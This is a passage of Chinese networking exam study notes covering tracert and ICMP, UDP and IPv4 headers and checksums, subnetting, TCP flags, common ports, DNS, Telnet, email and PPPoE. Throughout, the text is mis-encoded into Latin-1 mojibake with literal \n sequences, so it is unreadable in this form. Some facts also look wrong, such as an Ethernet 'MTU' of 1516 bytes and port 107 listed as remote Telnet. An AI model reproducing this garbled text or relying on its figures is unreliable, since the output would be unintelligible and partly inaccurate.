æ¯æ¬¡å°†é€å‡ºçš„æ•°æ®åŒ…çš„TTL åŠ 1æ¥å‘ç°å¦ä¸€ä¸ªè·¯ç”±å™¨ï¼Œè¿™ä¸ªé‡å¤çš„åŠ¨ä½œä¸€ç›´æŒç»­åˆ°æŸä¸ªæ•°æ®åŒ… æŠµè¾¾ç›®çš„åœ°ã€‚å½“æ•°æ®åŒ…åˆ°è¾¾ç›®çš„åœ°åï¼Œè¯¥ä¸»æœºåˆ™ä¸ä¼šé€å›ICMP time exceededæ¶ˆæ¯ï¼Œä¸€æ—¦åˆ°è¾¾ç›®çš„åœ°ï¼Œç”±äºtracerté€šè¿‡UDPæ•°æ®åŒ…å‘ä¸å¸¸è§ç«¯å£(30000ä»¥ä¸Š)å‘é€æ•°æ®åŒ…ï¼Œå› æ­¤ä¼šæ”¶åˆ°ã€ŒICMP port unreachableã€æ¶ˆæ¯ï¼Œæ•…å¯åˆ¤æ–­åˆ°è¾¾ç›®çš„åœ°ã€‚\n\ntracert æœ‰ä¸€ä¸ªå›ºå®šçš„æ—¶é—´ç­‰å¾…å“åº”(ICMP TTLåˆ°æœŸæ¶ˆæ¯)ã€‚å¦‚æœè¿™ä¸ªæ—¶é—´è¿‡äº†ï¼Œå®ƒå°†æ‰“å°å‡ºä¸€ç³»åˆ—çš„*å·è¡¨æ˜ï¼šåœ¨è¿™ä¸ªè·¯å¾„ä¸Šï¼Œè¿™ä¸ªè®¾å¤‡ä¸èƒ½åœ¨ç»™å®šçš„æ—¶é—´å†…å‘å‡ºICMP TTLåˆ°æœŸæ¶ˆæ¯çš„å“åº”ã€‚ç„¶åï¼ŒTracertç»™TTLè®°æ•°å™¨åŠ 1ï¼Œç»§ç»­è¿›è¡Œã€‚ï¼ˆæ³¨æ„ï¼šé»˜è®¤æ˜¯æœ€å¤š30è·³å°±ç»“æŸ ï¼‰\n```\n![](https://i.loli.net/2019/11/22/aFh6743EwXjfD1T.png)\nICMPåè®®çš„ä½œç”¨:æ£€æµ‹ç½‘ç»œé€šä¿¡æ•…éšœå’Œå®ç°é“¾è·¯è¿½è¸ªï¼Œè´Ÿè´£æä¾›TCP/IPç½‘ç»œä¸Šçš„è®¾å¤‡ã€æœåŠ¡ä»¥åŠè·¯ç”±å™¨å¯ç”¨æ€§çš„ä¿¡æ¯ã€‚\n\n#### 9ã€å¿…é¡»æŒæ¡UDPåè®®é¦–éƒ¨æ ¼å¼åŠå„å­—æ®µçš„ä½ç½®åŠä½œç”¨ï¼Œèƒ½æ ¹æ®ç»™å‡ºçš„é¦–éƒ¨åå…­è¿›åˆ¶å€¼æ¥è¯´æ˜å„å­—æ®µçš„å€¼ä»£è¡¨çš„å…·ä½“å«ä¹‰ï¼Œä»è€Œåˆ†æå‡ºUDPæŠ¥æ–‡çš„ä½œç”¨ã€‚\n\n**UDPçš„é¦–éƒ¨æ ¼å¼:**\nÂ Â Â Â Â Â  ç”¨æˆ·æ•°æ®æŠ¥UDPæœ‰ä¸¤ä¸ªå­—æ®µï¼šæ•°æ®å­—æ®µå’Œé¦–éƒ¨å­—æ®µã€‚é¦–éƒ¨å­—æ®µå¾ˆç®€å•ï¼Œåªæœ‰8ä¸ªå­—èŠ‚ï¼Œç”±å››ä¸ªå­—æ®µç»„æˆï¼Œ`æ¯ä¸ªå­—æ®µçš„é•¿åº¦éƒ½æ˜¯ä¸¤ä¸ªå­—èŠ‚`ã€‚å„å­—æ®µçš„æ„ä¹‰å¦‚ä¸‹ï¼š\n\n```\n(1)Â  æºç«¯å£Â Â Â Â Â  æºç«¯å£å·ã€‚åœ¨éœ€è¦å¯¹æ–¹å›ä¿¡æ—¶é€‰ç”¨ã€‚ä¸éœ€è¦æ—¶å¯ç”¨å…¨0ã€‚\n(2)Â  ç›®çš„ç«¯å£Â Â Â  ç›®çš„ç«¯å£å·ã€‚ è¿™åœ¨ç»ˆç‚¹äº¤ä»˜æŠ¥æ–‡æ—¶å¿…é¡»è¦ä½¿ç”¨åˆ°ã€‚\n(3)Â  é•¿åº¦Â  Â Â Â Â Â Â UDPç”¨æˆ·æ•°æ®æŠ¥çš„é•¿åº¦ï¼Œå…¶æœ€å°å€¼æ˜¯8ï¼ˆä»…æœ‰é¦–éƒ¨ï¼‰\n(4)Â  æ£€éªŒå’ŒÂ Â Â Â Â  æ£€æµ‹UDPç”¨æˆ·æ•°æ®æŠ¥åœ¨ä¼ è¾“ä¸­æ˜¯å¦æœ‰é”™ã€‚æœ‰é”™å°±ä¸¢å¼ƒã€‚\n```\n![](https://i.loli.net/2019/11/23/Bb8st4IPhwELpDy.png)\n ä¸€ä¸ªUDPæ¨¡å—å¿…é¡»æä¾›äº§ç”Ÿå’ŒéªŒè¯æ£€éªŒå’Œçš„åŠŸèƒ½ï¼Œä½†æ˜¯ä¸€ä¸ªåº”ç”¨ç¨‹åºåœ¨ä½¿ç”¨UDPæœåŠ¡æ—¶ï¼Œå¯ä»¥è‡ªç”±é€‰æ‹©æ˜¯å¦è¦æ±‚äº§ç”Ÿæ ¡æ£€å’Œã€‚åœ¨è®¡ç®—æ ¡æ£€å’Œæ—¶ï¼Œè¦åœ¨UDPç”¨æˆ·æ•°æ®æŠ¥ä¹‹å‰å¢åŠ 12å­—èŠ‚çš„ä¼ªé¦–éƒ¨ã€‚æ ¡æ£€å’Œå°±æ˜¯æŒ‰ç…§è¿™ä¸ªä¸´æ—¶çš„UDPç”¨æˆ·æ•°æ®æŠ¥æ¥è®¡ç®—çš„ã€‚\n\nÂ Â Â Â Â Â  UDPè®¡ç®—æ ¡æ£€å’Œçš„æ–¹æ³•å’Œè®¡ç®—IPæ•°æ®æŠ¥é¦–éƒ¨æ ¡æ£€å’Œçš„æ–¹æ³•ç›¸ä¼¼ã€‚ä½†ä¸åŒçš„æ˜¯ï¼šIPæ•°æ®æŠ¥çš„æ ¡æ£€å’Œåªæ ¡æ£€IPæ•°æ®æŠ¥çš„é¦–éƒ¨ï¼Œä½†UDPçš„æ ¡æ£€å’Œä½¿æŠŠé¦–éƒ¨å’Œæ•°æ®éƒ¨åˆ†ä¸€èµ·éƒ½æ ¡æ£€ã€‚\n\n#### 10ã€ç½‘ç»œåœ°å€ã€å­ç½‘æ©ç çš„è®¡ç®—æ–¹æ³•ï¼›å­ç½‘å¹¿æ’­åœ°å€ã€ç½‘å…³ç­‰æ¦‚å¿µ\n\n[IPåœ°å€ã€å­ç½‘æ©ç å’Œç½‘ç»œå·çš„è®¡ç®—](https://zhuanlan.zhihu.com/p/32361762)\n[å­ç½‘æ©ç çš„è®¡ç®—åŠä¸å­ç½‘æ•°ã€ä¸»æœºæ•°å…³ç³»](https://blog.csdn.net/yinshitaoyuan/article/details/51782330)\nå¯¹äºAç±»åœ°å€æ¥è¯´ï¼Œé»˜è®¤çš„å­ç½‘æ©ç æ˜¯255.0.0.0ï¼›å¯¹äºBç±»åœ°å€æ¥è¯´é»˜è®¤çš„å­ç½‘æ©ç æ˜¯255.255.0.0ï¼›å¯¹äºCç±»åœ°å€æ¥è¯´é»˜è®¤çš„å­ç½‘æ©ç æ˜¯255.255.255.0\nç½‘ç»œæµé‡åˆ†ä¸ºï¼šå¹¿æ’­ã€ç»„æ’­ã€å•æ’­\nå¹¿æ’­ï¼šæ•°æ®åŒ…ä¼šè¢«å‘é€åˆ°ä¸€ä¸ªç½‘æ®µçš„æ‰€æœ‰ç«¯å£ï¼Œåœ¨ä¸€ä¸ªIPç½‘ç»œèŒƒå›´ä¸­æœ€å¤§çš„IPåœ°å€æ˜¯è¢«ä¿ç•™ä½œä¸º`å¹¿æ’­åœ°å€`\nä¾‹å¦‚ï¼šIPèŒƒå›´192.168.0.xxx,å­ç½‘æ©ç æ˜¯255.255.255.0ï¼Œåˆ™å¹¿æ’­åœ°å€ä¸º192.168.0.255\nç»„æ’­ï¼šä¸€ç§å°†å•ä¸€æ¥æºæ•°æ®åŒ…åŒæ—¶ä¼ è¾“ç»™å¤šä¸ªç›®æ ‡çš„é€šä¿¡æ–¹å¼\nå•æ’­ï¼šæ•°æ®åŒ…ä¼šä»ä¸€å°è®¡ç®—æœºç›´æ¥ä¼ è¾“åˆ°å¦ä¸€å°è®¡ç®—æœº\nç½‘å…³:ç½‘å…³ï¼ˆGatewayï¼‰å°±æ˜¯ä¸€ä¸ªç½‘ç»œè¿æ¥åˆ°å¦ä¸€ä¸ªç½‘ç»œçš„â€œå…³å£â€ã€‚ä¹Ÿå°±æ˜¯ç½‘ç»œå…³å¡ã€‚\n\n#### 11ã€ IPv4åè®®çš„æ ¡éªŒå’ŒåŸŸ\n\nIPæ•°æ®æŠ¥çš„æ ¡éªŒå’Œåªæ£€éªŒIPæ•°æ®æŠ¥çš„é¦–éƒ¨ã€‚\n\nå½“å‘é€IPåŒ…æ—¶ï¼Œéœ€è¦è®¡ç®—IPæŠ¥å¤´çš„æ ¡éªŒå’Œï¼š\næŠŠæ ¡éªŒå’Œå­—æ®µç½®ä¸º0ï¼›\nå¯¹IPå¤´éƒ¨ä¸­çš„æ¯16bitè¿›è¡ŒäºŒè¿›åˆ¶æ±‚å’Œï¼›\nå¦‚æœå’Œçš„é«˜16bitä¸ä¸º0ï¼Œåˆ™å°†å’Œçš„é«˜16bitå’Œä½16bitåå¤ç›¸åŠ ï¼Œç›´åˆ°å’Œçš„é«˜16bitä¸º0ï¼Œä»è€Œè·å¾—ä¸€ä¸ª16bitçš„å€¼ï¼›\nå°†è¯¥16bitçš„å€¼å–åï¼Œå­˜å…¥æ ¡éªŒå’Œå­—æ®µã€‚\n\n#### **12ã€PPPåè®®**\n\n[PPPåè®®](https://blog.csdn.net/windeal3203/article/details/51066331)\nè®¡ç®—æœºç½‘ç»œ76é¡µ\n\n#### **13ã€IPv4ç‰¹ç‚¹**\n\nIPv4åœ°å€å¯ä»¥åˆ†ä¸ºç½‘ç»œåœ°å€å’Œä¸»æœºåœ°å€ä¸¤éƒ¨åˆ†,IPv4é‡‡ç”¨32ä½åœ°å€é•¿åº¦\nâ‘ IPåè®®æ˜¯ä¸€ç§æ— è¿æ¥ã€ä¸å¯é çš„åˆ†ç»„ä¼ é€æœåŠ¡çš„åè®®ã€‚\nâ‘¡IPåè®®æ˜¯ç‚¹-ç‚¹çº¿è·¯çš„ç½‘ç»œå±‚é€šä¿¡åè®®ã€‚\nâ‘¢IPåè®®å±è”½äº†ç½‘ç»œåœ¨æ•°æ®é“¾è·¯å±‚ã€ç‰©ç†å±‚åè®®ä¸å®ç°æŠ€æœ¯ä¸Šçš„å·®å¼‚ã€‚\n[OSIå‚è€ƒæ¨¡å‹â€”â€”ç½‘ç»œå±‚ï¼šIPv4åè®®å’ŒIPv6åè®®è¯¦è§£](https://blog.csdn.net/jeffleo/article/details/53933937)\n\n#### **14ã€Pingä¸ICMP**\n\nPingå‘½ä»¤æ˜¯åŸºäºICMPåè®®çš„ï¼Œä¸»è¦ç›®çš„æ˜¯æµ‹è¯•è®¾å¤‡ä¹‹é—´çš„é€šä¿¡ã€‚å®ƒå…ˆå‘é€ä¸€ä¸ªICMPè¯·æ±‚ç»™ç›®çš„åœ°å€ï¼ŒICMPåè®®è§„å®šç›®çš„ä¸»æœºå¿…é¡»è¿”å›ICMPå›é€åº”ç­”æ¶ˆæ¯ç»™ä¸»æœºã€‚ \n\n#### **15ã€äº†è§£TCPä¸æµé‡æ§åˆ¶**\n\nå¦‚æœä¸»æœºAÂ ä¸€ç›´å‘ä¸»æœºBå‘é€æ•°æ®ï¼Œä¸è€ƒè™‘ä¸»æœºBçš„æ¥å—èƒ½åŠ›ï¼Œåˆ™å¯èƒ½å¯¼è‡´ä¸»æœºBçš„æ¥å—ç¼“å†²åŒºæ»¡äº†è€Œæ— æ³•å†æ¥å—æ•°æ®ï¼Œä»è€Œä¼šå¯¼è‡´å¤§é‡çš„æ•°æ®ä¸¢åŒ…ï¼Œå¼•å‘é‡ä¼ æœºåˆ¶ã€‚è€Œåœ¨é‡ä¼ çš„è¿‡ç¨‹ä¸­ï¼Œè‹¥ä¸»æœºBçš„æ¥æ”¶ç¼“å†²åŒºæƒ…å†µä»æœªå¥½è½¬ï¼Œåˆ™ä¼šå°†å¤§é‡çš„æ—¶é—´æµªè´¹åœ¨é‡ä¼ æ•°æ®ä¸Šï¼Œé™ä½ä¼ é€æ•°æ®çš„æ•ˆç‡ã€‚\næ‰€ä»¥å¼•å…¥æµé‡æ§åˆ¶æœºåˆ¶ï¼Œä¸»æœºBé€šè¿‡å‘Šè¯‰ä¸»æœºAè‡ªå·±æ¥æ”¶ç¼“å†²åŒºçš„å¤§å°ï¼Œæ¥ä½¿ä¸»æœºAæ§åˆ¶å‘é€çš„æ•°æ®é‡ã€‚æµé‡æ§åˆ¶ä¸TCPåè®®æŠ¥å¤´ä¸­çš„çª—å£å¤§å°æœ‰å…³ã€‚\nTCPæŠ¥å¤´ä¸­çš„16ä½çª—å£å¤§å°ï¼ŒæŒ‡è‡ªå·±æ¥æ”¶ç¼“å†²åŒºçš„å‰©ä½™å¤§å°ã€‚\n![2018070917483846.png](https://i.loli.net/2019/11/21/LnHr78w1JAUcMy4.png)\n\n#### **16ã€TCPå’ŒUDPç«¯å£**\n\n```\n43  TCP  whoisåè®®\n57  TCP  MTPï¼Œé‚®ä»¶ä¼ è¾“åè®®\n80  TCP  HTTPåè®®\n88  TCP  Kerberos-è®¤è¯ä»£ç†\n107  TCP  è¿œç¨‹Telnetåè®®\n109  TCP  POPï¼ˆé‚®å±€åè®®ï¼‰\n110  TCP  POP3ï¼ˆé‚®å±€åè®®ç¬¬ä¸‰ç‰ˆï¼‰\n69  UDP  TFTPï¼ˆå°å‹æ–‡ä»¶ä¼ è¾“åè®®ï¼‰\n```\n#### **17ã€SYNï¼ŒACKï¼ŒRSTï¼ŒURGç­‰çš„ä½¿ç”¨**\n\n```\nURG:è¡¨ç¤ºæœ¬æŠ¥æ–‡æ®µä¸­å‘é€çš„æ•°æ®æ˜¯å¦åŒ…å«ç´§æ€¥æ•°æ®ã€‚URG=1ï¼Œè¡¨ç¤ºæœ‰ç´§æ€¥æ•°æ®ã€‚ç´§æ€¥æŒ‡é’ˆå­—æ®µåªæœ‰å½“URG=1æ—¶æ‰æœ‰æ•ˆã€‚\nACKï¼šè¡¨ç¤ºæ˜¯å¦å‰é¢çš„ç¡®è®¤å·å­—æ®µæ˜¯å¦æœ‰æ•ˆã€‚ACK=1ï¼Œè¡¨ç¤ºæœ‰æ•ˆã€‚TCPè§„å®šï¼Œè¿æ¥å»ºç«‹åï¼ŒACKå¿…é¡»ä¸º1ã€‚\nPSHï¼šå‘Šè¯‰å¯¹æ–¹æ”¶åˆ°è¯¥æŠ¥æ–‡æ®µåæ˜¯å¦åº”è¯¥ç«‹å³æŠŠæ•°æ®æ¨é€ç»™ä¸Šå±‚ã€‚å¦‚æœä¸º1ï¼Œåˆ™è¡¨ç¤ºå¯¹æ–¹åº”å½“ç«‹å³æŠŠæ•°æ®æäº¤ç»™ä¸Šå±‚ï¼Œè€Œä¸æ˜¯ç¼“å­˜èµ·æ¥ã€‚\nRSTï¼šåªæœ‰å½“RST=1æ—¶æ‰æœ‰æ•ˆã€‚å¦‚æœæ”¶åˆ°ä¸€ä¸ªRST=1çš„æŠ¥æ–‡ï¼Œè¯´æ˜ä¸ä¸»æœºçš„è¿æ¥å‡ºç°äº†ä¸¥é‡é”™è¯¯ï¼Œå¿…é¡»é‡Šæ”¾è¿æ¥ï¼Œç„¶åå†é‡æ–°å»ºç«‹è¿æ¥ã€‚æˆ–è€…è¯´æ˜ä¸Šæ¬¡å‘é€ç»™ä¸»æœºçš„æ•°æ®æœ‰é—®é¢˜ï¼Œä¸»æœºæ‹’ç»å“åº”ã€‚\nSYNï¼šåœ¨å»ºç«‹è¿æ¥æ—¶ä½¿ç”¨ï¼Œç”¨æ¥åŒæ­¥åºå·ã€‚å½“SYN=1ï¼ŒACK=0æ—¶ï¼Œè¡¨ç¤ºè¿™æ˜¯ä¸€ä¸ªè¯·æ±‚å»ºç«‹è¿æ¥çš„æŠ¥æ–‡æ®µï¼›å½“SYN=1ï¼ŒACK=1æ—¶ï¼Œè¡¨ç¤ºå¯¹æ–¹åŒæ„å»ºç«‹è¿æ¥ã€‚åªæœ‰åœ¨å‰ä¸¤æ¬¡æ¡æ‰‹ä¸­SYNæ‰ç½®ä¸º1ã€‚\nFINï¼šæ ‡è®°æ•°æ®æ˜¯å¦å‘é€å®Œæ¯•ã€‚å¦‚æœFIN=1ï¼Œåˆ™å¯ä»¥é‡Šæ”¾è¿æ¥ã€‚\n```\n[TCPä¸­çš„URGä¸PSH](https://blog.csdn.net/superficial_/article/details/74857584)\n[TCPçš„çŠ¶æ€ (SYN, FIN, ACK, PSH, RST, URG)](https://www.jianshu.com/p/440cd1e7a81a)\n\n#### **18ã€å¸¸è§ç«¯å£å·åŠå¯¹åº”çš„åè®®**\n\n![2019-11-20_160111.png](https://i.loli.net/2019/11/20/a1X3KdWRIv8o5pH.png)\n\n#### **19ã€ç†Ÿæ‚‰FTPã€DNSã€Telnetã€ç”µå­é‚®ä»¶**\n\n[FTP:21](https://blog.csdn.net/ZWE7616175/article/details/81356015)\n**DNS:53**\næä¾›åŸŸååˆ°IPåœ°å€çš„è§£æ\nDNSæœåŠ¡å™¨åˆ†ä¸º4ç§ï¼šæœ¬åœ°åŸŸåæœåŠ¡å™¨ï¼ˆä¹Ÿç§°é»˜è®¤åŸŸåæœåŠ¡å™¨ï¼‰ï¼Œæ ¹åŸŸåæœåŠ¡å™¨ï¼Œé¡¶çº§åŸŸåæœåŠ¡å™¨ï¼Œæƒé™åŸŸåæœåŠ¡å™¨\næŸ¥è¯¢è¿‡ç¨‹ï¼šä¸»æœºå‘æœ¬åœ°åŸŸåæœåŠ¡å™¨è¿›è¡Œé€’å½’æŸ¥è¯¢ï¼Œå³æœ¬åœ°åŸŸåæœåŠ¡å™¨å¦‚æœä¸çŸ¥é“åŸŸåçš„IPï¼Œå°±ä»¥DNSå®¢æˆ·çš„èº«ä»½å‘å…¶ä»–æ ¹åŸŸåæœåŠ¡å™¨å‘èµ·æŸ¥è¯¢ã€‚æœ¬åœ°åŸŸåæœåŠ¡å™¨å‘æ ¹åŸŸåæœåŠ¡å™¨å‘èµ·çš„æŸ¥è¯¢ä¸ºè¿­ä»£æŸ¥è¯¢ï¼Œå³è¦ä¹ˆè¿”å›IPåœ°å€ï¼Œè¦ä¹ˆè¿”å›ä¸‹ä¸€ä¸ªæŸ¥è¯¢çš„DNSæœåŠ¡å™¨ï¼Œç”±æœ¬åœ°åŸŸåæœåŠ¡å™¨å†è¿›è¡ŒæŸ¥è¯¢ã€‚\n**Telnet:** 23\nä»€ä¹ˆæ˜¯telnetæœåŠ¡ï¼šè¿œç¨‹ç™»å½•çš„æœåŠ¡ï¼Œç®¡ç†æœåŠ¡å™¨çš„æ“ä½œ\nåŸç†\n1ï¼‰ä¸è¿œç¨‹ä¸»æœºå»ºç«‹ä¸€ä¸ªTCPè¿æ¥ï¼Œç”¨æˆ·å¿…é¡»çŸ¥é“è¿œç¨‹ä¸»æœºçš„Ipåœ°å€æˆ–åŸŸåï¼›\n2ï¼‰å°†æœ¬åœ°ç»ˆç«¯ä¸Šè¾“å…¥çš„ç”¨æˆ·åå’Œå£ä»¤åŠä»¥åè¾“å…¥çš„ä»»ä½•å‘½ä»¤æˆ–å­—ç¬¦ä»¥NVTï¼ˆNet Virtual Terminalï¼‰æ ¼å¼ä¼ é€åˆ°è¿œç¨‹ä¸»æœºã€‚è¯¥è¿‡ç¨‹å®é™…ä¸Šæ˜¯ä»æœ¬åœ°ä¸»æœºå‘è¿œç¨‹ä¸»æœºå‘é€ä¸€ä¸ªIPæ•°æ®åŒ…ï¼›\n3ï¼‰å°†è¿œç¨‹ä¸»æœºè¾“å‡ºçš„NVTæ ¼å¼çš„æ•°æ®è½¬åŒ–ä¸ºæœ¬åœ°æ‰€æ¥å—çš„æ ¼å¼é€å›æœ¬åœ°ç»ˆç«¯ï¼ŒåŒ…æ‹¬è¾“å…¥å‘½ä»¤å›æ˜¾å’Œå‘½ä»¤æ‰§è¡Œç»“æœï¼›\n4ï¼‰æœ€åï¼Œæœ¬åœ°ç»ˆç«¯å¯¹è¿œç¨‹ä¸»æœºè¿›è¡Œæ’¤æ¶ˆè¿æ¥ã€‚è¯¥è¿‡ç¨‹æ˜¯æ’¤é”€ä¸€ä¸ªTCPè¿æ¥ã€‚\nNVTæ ¼å¼è¿›è¡Œå‘é€\n**ç”µå­é‚®ä»¶:(SMTP:25,POP3:110,IMAP:143)**\nSMTPå‘é€ï¼ŒPOP3å’ŒIMAPè¯»å–\nç”±å‘ä»¶äººå†™é‚®ä»¶ï¼Œç”¨SMTPå‘åˆ°å‘é€æ–¹é‚®ä»¶æœåŠ¡å™¨ã€‚\nå‘é€æ–¹é‚®ä»¶æœåŠ¡å™¨ä¸æ¥æ”¶æ–¹é‚®ä»¶æœåŠ¡å™¨å»ºç«‹TCPè¿æ¥ï¼Œå‘é‚®ä»¶ã€‚\næ”¶ä»¶äººä½¿ç”¨POP3è¯»å–é‚®ä»¶ã€‚\n\n#### **20ã€ç½‘ç»œåˆ†æµå™¨åˆ†ç±»**\n\nç½‘ç»œåˆ†æµå™¨ç±»å‹æŒ‰é€Ÿåº¦åˆ†å››ç§ï¼š\nåƒå…†çš„ç½‘ç»œåˆ†æµå™¨ï¼Œ10ï¼§çš„ç½‘ç»œåˆ†æµå™¨ï¼Œ40ï¼§çš„ç½‘ç»œåˆ†æµå™¨ï¼Œ100ï¼§çš„ç½‘ç»œåˆ†æµå™¨\nç½‘ç»œåˆ†æµå™¨æŒ‰ç½‘ç»œæŠ€æœ¯åˆ†å››ç§ï¼š\nï¼°ï¼¯ï¼³æŠ€æœ¯ï¼Œï¼¬ï¼¡ï¼®æŠ€æœ¯ï¼Œä»¥å¤ªç½‘æŠ€æœ¯ï¼Œï¼·ï¼¡ï¼®æŠ€æœ¯\nç½‘ç»œåˆ†æµå™¨æŒ‰å¤–å½¢æ¥åˆ†ä¸¤ç§ï¼š\nç›’å¼1ï¼µè®¾å¤‡ï¼Œï¼¡ï¼´ï¼£ï¼¡è®¾å¤‡\nç½‘ç»œåˆ†æµå™¨å¦‚æœæŒ‰åŠŸèƒ½åˆ’åˆ†ï¼š\né€šç”¨å‹æ±‡èšåˆ†æµè®¾å¤‡ï¼Œè­¦å£è®¾å¤‡ï¼Œï¼¤è®¾å¤‡ï¼Œå®šåˆ¶è®¾å¤‡ç­‰\nç½‘ç»œåˆ†æµå™¨å¦‚æœæŒ‰ç½‘ç»œæ¥åˆ†ï¼š\nç§»åŠ¨äº’è”ç½‘ç½‘ç»œåˆ†æµå™¨ï¼Œå›ºç½‘ç½‘ç»œåˆ†æµå™¨\n\n#### **21ã€ç‰©ç†åœ°å€ã€ç«¯å£åœ°å€ã€é€»è¾‘åœ°å€**\n\n```\na.ç‰©ç†åœ°å€--MACåœ°å€\nç‰©ç†åœ°å€å·¥ä½œåœ¨æœ€åº•å±‚ï¼Œå³æ•°æ®é“¾è·¯å±‚å’Œç‰©ç†å±‚çš„å¸§ï¼ˆframeï¼Œä¸€ç§æ•°æ®å•ä½ï¼Œç”±æ¯”ç‰¹æ„æˆï¼‰ä¸­ï¼Œå®ƒæ¯ä¸€æ¬¡ä¼ è¾“éƒ½ä¼šæ”¹å˜ï¼Œæ¯”å¦‚ä»å¸§Aä¸€å°è®¡ç®—æœºaåˆ°ä¸€ä¸ªè·¯ç”±å™¨bä½¿ç”¨äº†ä¸€ç»„åœ°å€ï¼Œè¯¥å¸§Aåœ¨è·¯ç”±å™¨båˆ°è·¯ç”±å™¨cä¸­å°±ä¼šæ¢å¦ä¸€ç»„åœ°å€ï¼Œå®ƒæ˜¯å¯å˜çš„ã€‚\nb.é€»è¾‘åœ°å€--IPåœ°å€\nå³ä¸–ç•Œä¸Šæ‰€æœ‰çš„è®¡ç®—æœºéƒ½æœ‰ä¸€ä¸ª32ä½çš„åœ°å€ï¼ˆIPv4ï¼‰ï¼Œå®ƒå”¯ä¸€çš„è¡¨ç¤ºæ¯ä¸€å°è®¡ç®—æœºï¼Œåæ¥IPv4åœ°å€ä¸å¤Ÿç”¨äº†ï¼Œå°±å‡ºç°äº†IPv6åœ°å€ï¼Œ128ä½é•¿ã€‚åªéœ€è®°ä½ä¸€ç‚¹ï¼Œæ— è®ºIPv4è¿˜æ˜¯IPv6åœ°å€éƒ½æ˜¯é€»è¾‘åœ°å€ï¼Œå®ƒä»¬æ˜¯å”¯ä¸€çš„è¡¨ç¤ºä¸€å°è®¡ç®—æœºçš„IPåœ°å€ã€‚å®ƒå·¥ä½œåœ¨ç½‘ç»œå±‚ï¼Œåœ¨ä¼ è¾“çš„è¿‡ç¨‹ä¸­æ˜¯ä¸ä¼šå˜çš„ã€‚\nc.ç«¯å£åœ°å€\næˆ‘ä»¬é€šè¿‡é€»è¾‘åœ°å€å®ç°äº†è®¡ç®—æœºä¹‹é—´çš„é€šä¿¡ï¼Œä½†æ˜¯è¿™æ ·å¹¶æ²¡æœ‰ä»€ä¹ˆæ„ä¹‰ï¼Œæ¯”å¦‚ä½ åœ¨æ‰“è‹±é›„è”ç›Ÿï¼Œè¿™æ—¶ä½ éœ€è¦æŠŠæ•°æ®ä¼ è¾“åˆ°å…¶ä»–ç©å®¶çš„è®¡ç®—æœºä¸Šè¿˜æ˜¯ä¼ è¾“åˆ°å…¶ä»–ç©å®¶çš„è‹±é›„è”ç›Ÿä¸Šå‘¢ï¼Ÿä½ æ‰“å‡ºäº†100ç‚¹ä¼¤å®³ï¼Œè¿™æ ·ä¸€ä¸ªæ•°å­—ï¼Œä¼ åˆ°è®¡ç®—æœºä¸Šæ¯«æ— æ„ä¹‰ï¼Œä½†æ˜¯ä¼ è¾“åˆ°è‹±é›„è”ç›Ÿä¸­ï¼Œè‹±é›„è”ç›Ÿå°±çŸ¥é“ä½ é€ æˆäº†100ç‚¹ä¼¤å®³ï¼Œå¹¶åœ¨æ¸¸æˆé‡Œè®¡ç®—ã€‚è¿™æ ·ä¸€ä¸ªç®€å•çš„ä¾‹å­è¯´æ˜è®¡ç®—æœºä¹‹é—´çš„é€šä¿¡å®è´¨ä¸Šæ˜¯ä¸åŒè®¡ç®—æœºä¹‹é—´è¿›ç¨‹çš„é€šä¿¡ã€‚è€Œç«¯å£å·å°±æ˜¯å”¯ä¸€çš„è¡¨ç¤ºè¿™äº›è¿›ç¨‹çš„ç¼–å·ã€‚(è¿›ç¨‹ï¼šè¿è¡Œç€çš„ç¨‹åº)ç«¯å£å·æœ‰16ä½ï¼Œ0åˆ°65535ï¼Œä¸€å…±æœ‰2^16ä¸ªç«¯å£å·ã€‚é€šè¿‡ç«¯å£å·å¯ä»¥æ‰¾åˆ°è®¡ç®—æœºè¿è¡Œçš„åº”ç”¨ç¨‹åºã€‚å¦‚WebæœåŠ¡å™¨å¯¹åº”çš„ç«¯å£å·æ˜¯80ï¼Œæˆ‘ä»¬é€šè¿‡80ç«¯å£å®ç°äº†ä¸Šç½‘çš„åŠŸèƒ½ã€‚ç«¯å£åœ°å€å·¥ä½œåœ¨ä¼ è¾“å±‚ï¼Œåœ¨ä¼ è¾“çš„è¿‡ç¨‹ä¸­æ˜¯ä¸ä¼šå˜çš„ï¼Œç«¯å£åœ°å€å°±æ˜¯ç«¯å£å·ã€‚\n\n\nç«¯å£åœ°å€â€”â€”ä¼ è¾“å±‚\né€»è¾‘åœ°å€â€”â€”ç½‘ç»œå±‚\nç‰©ç†åœ°å€â€”â€”æ•°æ®é“¾è·¯å±‚å’Œç‰©ç†å±‚\n```\n#### **22ã€äº¤æ¢å¼ç½‘ç»œä¸­æ•è·ç½‘ç»œæµé‡çš„åŸºæœ¬æ–¹æ³•**\n\n4ç§ \nç«¯å£é•œåƒã€é›†çº¿å™¨æ¥å‡ºã€ä½¿ç”¨ç½‘ç»œåˆ†æµå™¨ã€ARPç¼“å­˜æ±¡æŸ“æ”»å‡»\n\n#### **23ã€ä¼ è¾“å±‚å¯é æ€§çš„ä¿éšœæœºåˆ¶**\n\nï¼ˆ1ï¼‰æ ¡éªŒå’Œ\nï¼ˆ2ï¼‰é¢å‘è¿æ¥\nï¼ˆ3ï¼‰åºå·å’Œç¡®è®¤åºå·\nï¼ˆ4ï¼‰ç¡®è®¤åº”ç­”æœºåˆ¶ \nï¼ˆ5ï¼‰è¶…æ—¶é‡ä¼ æœºåˆ¶\nï¼ˆ6ï¼‰æµé‡æ§åˆ¶ \nï¼ˆ7ï¼‰æ‹¥å¡é¿å…\n\n#### **24ã€ä»¥å¤ªç½‘å¸§çš„æœ€å¤§å¸§é•¿ï¼ˆMTUï¼‰1516å­—èŠ‚ï¼Œä»¥å¤ªç½‘å¸§çš„æœ€å°å¸§é•¿64å­—èŠ‚**\n\n#### **25ã€é€šä¿¡æœåŠ¡å¯ä»¥åˆ†ä¸ºä¸¤å¤§ç±»**\n\né¢å‘è¿æ¥æœåŠ¡å’Œæ— è¿æ¥æœåŠ¡\n\n#### **26ã€äº†è§£ PPPoE**\n\nPPPoEï¼ˆè‹±è¯­ï¼šPoint-to-Point Protocol Over Ethernetï¼‰ï¼Œä»¥å¤ªç½‘ä¸Šçš„ç‚¹å¯¹ç‚¹åè®®ï¼Œæ˜¯å°†ç‚¹å¯¹ç‚¹åè®®ï¼ˆPPPï¼‰å°è£…åœ¨ä»¥å¤ªç½‘ï¼ˆEthernetï¼‰æ¡†æ¶ä¸­çš„ä¸€ç§ç½‘ç»œéš§é“åè®®ã€‚ç”±äºåè®®ä¸­é›†æˆPPPåè®®ï¼Œæ‰€ä»¥å®ç°å‡ºä¼ 